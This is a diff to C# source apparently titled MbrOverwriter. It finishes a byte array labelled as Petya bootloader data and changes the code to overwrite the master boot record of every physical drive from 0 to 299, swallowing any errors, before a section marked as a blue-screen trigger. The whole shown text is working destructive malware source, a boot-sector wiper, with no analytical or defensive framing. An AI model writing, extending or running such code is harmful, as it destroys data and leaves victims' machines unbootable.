@@ -2091,10 +2091,19 @@ namespace MbrOverwriter
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 
 }; //petya bootloader data
-
-            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
+            try
+            {
+                for (int s = 0; s < 300; s++)
+                {
+                    var mbr = CreateFile($"\\\\.\\PhysicalDrive{s}", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                 OpenExisting, 0, IntPtr.Zero);
-            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+                    WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+                }
+            }
+            catch
+            {
+
+            }
             Thread.Sleep(5000); //sleep 5 seconds
             //bsod trigger part 2
             Boolean t1;
